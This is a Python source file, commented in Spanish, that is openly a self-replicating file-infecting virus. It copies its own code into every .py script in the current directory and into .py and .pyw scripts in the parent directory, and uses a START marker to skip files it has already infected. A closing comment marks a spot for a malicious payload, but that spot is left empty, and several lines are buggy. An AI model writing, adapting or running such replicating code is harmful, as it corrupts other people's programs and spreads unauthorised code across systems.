###   START   ####
import sys, glob
import os

# Aquí guardo el código en una variable para poder copiarlo en los otros archivos más tarde
code = []
with open(sys.argv[0], 'r') as f: 
    lines = f.readlines()
for line in lines:
    if line == "###   END   ###\n":
        break
    code.append(line)

#Encuentra todos los scripts en el directorio
python_scripts = glob.glob('*.py') + glob.glob('+.pyw')
#Si no esta infectado infecta a todos los scripts .py/.pyw del directorio
for script in python_scripts:
    with open(script, 'r') as f: 
        script_code = f.readlines()
    infectado = False
    if "###   START   ####\n" in script_code: 
        infectado == True
        break
    if not infectado:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        with open(script, 'w') as f:
            f.writelines(final_code)
            f.close()

#Aquí obtienen el path anterior a este
current_path = sys.argv[0]
separate_current_path = current_path.split('/')
separate_current_path.pop(len(separate_current_path)-1)#Elimino el archivo .py de la lista
separate_current_path.pop(len(separate_current_path)-1)#Elimina la carpeta actual de la lista
new_path = ''.join([word+'/' for word in separate_current_path])
#Infecta todo los .py/.pyw del próximo directorio si estos no estan infectados ya
for file in glob.glob(f'{new_path}*.py'):
    try:
        with open(file, 'r') as f: 
            script_code = f.readlines()
        infectado = False
        if "###   START   ####\n" in script_code: 
            infectado == True
            break
        if not infectado:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)
            with open(file, 'w') as f:
                f.writelines(final_code)
                f.close()
    except: pass

for file in glob.glob(f'{new_path}*.pyw'):
    try:
        with open(file, 'r') as f: 
            script_code = f.readlines()
        infectado = False
        if "###   START   ####\n" in script_code: 
            infectado == True
            break
        if not infectado:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)
            with open(file, 'w') as f:
                f.writelines(final_code)
                f.close()
    except: pass

#Ejecuta el código malicioso que queremos en todo los archivos



###    END   ###
